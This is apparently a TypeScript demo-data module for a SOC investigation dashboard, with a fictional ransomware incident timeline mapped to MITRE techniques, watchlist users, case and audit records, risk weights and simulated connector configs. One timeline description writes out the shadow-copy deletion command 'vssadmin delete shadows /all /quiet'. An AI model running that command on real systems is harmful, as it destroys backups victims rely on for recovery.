      { hour: 40, timeLabel: 'T-40:00', title: 'Encoded PowerShell discovery', severity: 'critical', description: 'Hidden, encoded PowerShell ran net view / nltest from the beacon.', mitreTactic: 'Execution (T1059.001)', edgeId: 're2c' },
      { hour: 39, timeLabel: 'T-39:00', title: 'Startup-folder persistence', severity: 'high', description: 'Shortcut dropped in the Startup folder.', mitreTactic: 'Persistence (T1547.001)', edgeId: 're2d' },
      { hour: 15, timeLabel: 'T-15:00', title: 'Internal Recon & Share Discovery', severity: 'high', description: 'Attacker automated scan of corporate file shares.', mitreTactic: 'Discovery (T1083)', edgeId: 're3' },
      { hour: 3, timeLabel: 'T-03:00', title: 'Shadow copies deleted', severity: 'critical', description: 'vssadmin delete shadows /all /quiet.', mitreTactic: 'Impact (T1490)', edgeId: 're4' },
      { hour: 2, timeLabel: 'T-02:00', title: 'Ransomware canary tripped', severity: 'critical', description: 'Canary file on the Legal share renamed to .locked.', mitreTactic: 'Impact (T1486)', edgeId: 're5' }
    ]
  }
};

export const DEMO_WATCHLIST: WatchlistItem[] = [
  {
    id: 'wl-1',
    entityId: 'jsmith',
    canonicalName: 'j.smith (John Smith)',
    entityType: 'user',
    riskScore: 94,
    riskBand: 'HIGH',
    owner: 'soc.analyst.alex',
    reason: 'SEC-7019 anomalous login and sensitive HR database spike',
    expiry: '2026-10-04T00:00:00Z',
    sparkline: [12, 14, 18, 45, 88, 94],
    addedAt: '2026-09-27T10:14:00Z'
  },
  {
    id: 'wl-2',
    entityId: 'apatel',
    canonicalName: 'a.patel (Amina Patel)',
    entityType: 'user',
    riskScore: 88,
    riskBand: 'HIGH',
    owner: 'soc.analyst.priya',
    reason: 'AWS IAM AdministratorRole modified from DigitalOcean VPS',
    expiry: '2026-10-02T00:00:00Z',
    sparkline: [5, 5, 8, 34, 75, 88],
    addedAt: '2026-09-27T11:30:00Z'
  },
  {
    id: 'wl-3',
    entityId: 'mross',
    canonicalName: 'm.ross (Marcus Ross)',
    entityType: 'user',
    riskScore: 91,
    riskBand: 'HIGH',
    owner: 'soc.lead.marcus',
    reason: 'CobaltStrike beacon alert & mass file share enumeration',
    expiry: '2026-10-01T00:00:00Z',
    sparkline: [10, 10, 15, 60, 90, 91],
    addedAt: '2026-09-27T12:05:00Z'
  }
];

export const DEMO_CASES: CaseRecord[] = [
  {
    id: 'case-88912',
    caseRef: 'INC-88912',
    title: 'Anomalous Credential Access & High-Value DB Exfiltration',
    rootEntity: 'j.smith (USR-8492)',
    analyst: 'alex.soc@company.com',
    status: 'INVESTIGATING',
    severity: 'P1',
    windowHours: 48,
    nodeCount: 11,
    compromisedCount: 7,
    sha256: '9a72c114e9f7832d7fa8bc3e43048596ac048b610c439f0e1f7481ba92437dc1',
    createdAt: '2026-09-27T14:22:00Z',
    notes: 'DEMO CASE (fictional data). Isolated laptop in EDR; Kerberos tickets revoked.',
    verdict: 'MALICIOUS',
    pushedTo: ['Jira (INC-88912)', 'Slack (#incident-response)'],
    entityKey: 'jsmith',
    dataSource: 'demo',
    evidence: []
  }
];

export const DEMO_AUDIT: AuditLogEntry[] = [
  {
    id: 'aud-1',
    timestamp: '2026-09-27T14:20:12Z',
    analyst: 'alex.soc@company.com',
    action: 'SEARCH_ENTITY',
    entityId: 'jsmith',
    details: 'Resolved term jsmith to canonical USR-8492-JSMITH'
  },
  {
    id: 'aud-2',
    timestamp: '2026-09-27T14:22:45Z',
    analyst: 'alex.soc@company.com',
    action: 'EXPORT_REPLAY_MP4',
    entityId: 'jsmith',
    details: 'Client-side 30s 720p replay generated and hashed',
    sha256: '9a72c114e9f7832d7fa8bc3e43048596ac048b610c439f0e1f7481ba92437dc1'
  }
];

export const DEFAULT_ADMIN_CONFIG: AdminConfig = {
  retentionWindowHours: 48,
  maxRetentionDays: 7,
  crownJewelTags: ['crown_jewel', 'SRV-HR-DB01.corp', 'SRV-JUMP-02.corp', 'FS-CORP-SHARE01', 'HashiCorp Vault Prod'],
  vipEntities: ['m.ross@corp.com', 'ciso@corp.com', 'ceo@corp.com'],
  riskWeights: {
    bruteForceThenSuccess: 20,
    firstSeenHostApp: 10,
    crownJewelMultiplier: 2.0,
    newSourceIpAsn: 10,
    impossibleTravel: 25,
    mfaFatigue: 25,
    lateralFanOut: 20,
    privilegeChange: 20,
    massFileAccess: 15,
    largeUpload: 20
  },
  connectors: [
    { 
      id: 'conn-sentinel',
      name: 'Microsoft Sentinel', 
      vendor: 'Microsoft',
      category: 'SIEM', 
      type: 'SIEM', 
      status: 'CONNECTED', 
      eps: 3420, 
      lagMs: 42,
      lastSync: '1 minute ago',
      authType: 'OAuth2 / Entra App Registration',
      endpoint: 'https://api.loganalytics.io/v1/workspaces/ws-secops-991',
      eventsConsumed: 'SigninLogs, SecurityEvent, AADNonInteractiveUserSignInLogs',
      health: 'Optimal',
      alertsBuffered: 142,
      simulated: true
    },
    { 
      id: 'conn-secops',
      name: 'Google SecOps (Chronicle)', 
      vendor: 'Google Cloud',
      category: 'SIEM', 
      type: 'SIEM', 
      status: 'CONNECTED', 
      eps: 2890, 
      lagMs: 65,
      lastSync: '2 minutes ago',
      authType: 'Service Account Key (GCP IAM)',
      endpoint: 'https://malachiteingestion-pa.googleapis.com/v2',
      eventsConsumed: 'UDM Normalized Authentication, Network, Process',
      health: 'Optimal',
      alertsBuffered: 89,
      simulated: true
    },
    { 
      id: 'conn-splunk',
      name: 'Splunk Enterprise Security', 
      vendor: 'Splunk',
      category: 'SIEM', 
      type: 'SIEM', 
      status: 'STANDBY', 
      eps: 1850, 
      lagMs: 110,
      lastSync: '14 minutes ago',
      authType: 'HEC Token / REST API',
      endpoint: 'https://splunk-es.corp.internal:8089/services/collector',
      eventsConsumed: 'Notable Events, CIM Data Model Authentication',
      health: 'Degraded',
      alertsBuffered: 12,
      simulated: true
    },
    { 
      id: 'conn-crowdstrike',
      name: 'CrowdStrike Falcon FDR', 
      vendor: 'CrowdStrike',
      category: 'EDR', 
      type: 'EDR', 
      status: 'CONNECTED', 
      eps: 6120, 
      lagMs: 38,
      lastSync: 'Just now',
      authType: 'OAuth2 API Client ID/Secret',
      endpoint: 'https://api.crowdstrike.com/fdr/v1',
      eventsConsumed: 'ProcessRollup2, NetworkConnectIP4, LsassHandleAudit',
      health: 'Optimal',
      alertsBuffered: 310,
      simulated: true
    },
    { 
      id: 'conn-defender',
      name: 'Microsoft Defender for Endpoint', 
      vendor: 'Microsoft',
      category: 'EDR', 
      type: 'EDR', 
      status: 'CONNECTED', 
      eps: 4200, 
      lagMs: 55,
      lastSync: '3 minutes ago',
      authType: 'Microsoft Graph Security API',
      endpoint: 'https://api.securitycenter.microsoft.com/api',
      eventsConsumed: 'DeviceProcessEvents, DeviceNetworkEvents, DeviceLogonEvents',
      health: 'Optimal',
      alertsBuffered: 198,
      simulated: true
    },
    { 
      id: 'conn-okta',
      name: 'Okta Identity Cloud', 
      vendor: 'Okta',
      category: 'IdP', 
      type: 'IdP', 
      status: 'CONNECTED', 
      eps: 980, 
      lagMs: 25,
      lastSync: 'Just now',
      authType: 'SSWS API Token',
      endpoint: 'https://corp.okta.com/api/v1/logs',
      eventsConsumed: 'user.authentication.auth_via_mfa, user.session.start',
      health: 'Optimal',
      alertsBuffered: 76,
      simulated: true
    },
    { 
      id: 'conn-paloalto',
      name: 'Palo Alto Panorama / Prisma', 
      vendor: 'Palo Alto Networks',
      category: 'Firewall', 
      type: 'Firewall', 
      status: 'CONNECTED', 
      eps: 8900, 
      lagMs: 70,
      lastSync: '1 minute ago',
      authType: 'Syslog TLS / XML API Key',
      endpoint: 'https://panorama.internal.corp/api',
      eventsConsumed: 'Traffic, Threat, GlobalProtect VPN Logs',
      health: 'Optimal',
      alertsBuffered: 440,
      simulated: true
    },
    { 
      id: 'conn-zscaler',
      name: 'Zscaler Internet Access (ZIA NSS)', 
      vendor: 'Zscaler',
      category: 'Proxy', 
      type: 'Proxy', 
      status: 'CONNECTED', 
      eps: 3800, 
      lagMs: 80,
      lastSync: '5 minutes ago',
      authType: 'Cloud NSS Stream Token',
      endpoint: 'https://nss.zscaler.net/feed/stream',
      eventsConsumed: 'Web Proxy, Cloud App Control, DLP Hits',
      health: 'Optimal',
      alertsBuffered: 120,
      simulated: true
    }
  ]
};

export interface ConnectorConfig {
  id: string;
  name: string;
  vendor: string;
  category: string;
  type: string;
  status: string;
  eps: number;
  lagMs: number;
  lastSync: string;
  authType: string;
  endpoint: string;
  eventsConsumed: string;
  health: string;
  alertsBuffered: number;
  simulated: boolean; // true = placeholder card; no real connection or metrics
}

export interface AdminConfig {
  retentionWindowHours: number;
  maxRetentionDays: number;
  crownJewelTags: string[];
  vipEntities: string[];
  riskWeights: Record<string, number>;
  connectors: ConnectorConfig[];
}
